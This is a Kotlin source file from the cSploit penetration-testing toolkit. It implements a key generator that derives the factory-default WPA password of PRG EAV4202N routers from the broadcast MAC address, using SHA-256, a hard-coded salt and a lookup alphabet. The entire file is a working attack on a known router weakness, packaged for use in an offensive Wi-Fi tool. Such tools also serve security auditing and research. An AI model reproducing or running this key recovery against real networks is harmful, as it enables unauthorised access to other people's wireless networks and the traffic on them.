/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.strix.data.wifi.algorithms

import org.csploit.strix.data.wifi.Keygen
import java.security.MessageDigest

/**
 * PRG EAV4202N default WPA key algorithm.
 * http://sviehb.wordpress.com/2011/12/04/prg-eav4202n-default-wpa-key-algorithm/
 */
class PBSKeygen(
    ssid: String, mac: String, level: Int, enc: String
) : Keygen(ssid, mac, level, enc) {

    override fun getKeys(): List<String>? {
        val md: MessageDigest = try {
            MessageDigest.getInstance("SHA-256")
        } catch (e: Exception) {
            errorMessage = "This phone cannot process a SHA256 hash."
            return null
        }
        val macAddr = this.mac
        if (macAddr.length != 12) {
            errorMessage = "The MAC address is invalid."
            return null
        }
        val macHex = ByteArray(6)
        for (i in 0 until 12 step 2)
            macHex[i / 2] = ((Character.digit(macAddr[i], 16) shl 4) +
                    Character.digit(macAddr[i + 1], 16)).toByte()

        md.reset()
        md.update(SALT_SHA256)
        md.update(macHex)
        val hash = md.digest()
        val key = StringBuilder()
        for (i in 0 until 13) {
            key.append(LOOKUP[(if (hash[i] >= 0) hash[i].toInt() else 256 + hash[i].toInt()) % LOOKUP.length])
        }
        addPassword(key.toString())
        return getResults()
    }

    companion object {
        private val SALT_SHA256 = byteArrayOf(
            0x54, 0x45, 0x4F, 0x74, 0x65, 0x6C, 0xB6.toByte(),
            0xD9.toByte(), 0x86.toByte(), 0x96.toByte(), 0x8D.toByte(),
            0x34, 0x45, 0xD2.toByte(), 0x3B, 0x15,
            0xCA.toByte(), 0xAF.toByte(), 0x12, 0x84.toByte(), 0x02,
            0xAC.toByte(), 0x56, 0x00, 0x05, 0xCE.toByte(), 0x20, 0x75,
            0x94.toByte(), 0x3F, 0xDC.toByte(), 0xE8.toByte()
        )

        private const val LOOKUP = "0123456789ABCDEFGHIKJLMNOPQRSTUVWXYZabcdefghikjlmnopqrstuvwxyz"
    }
}
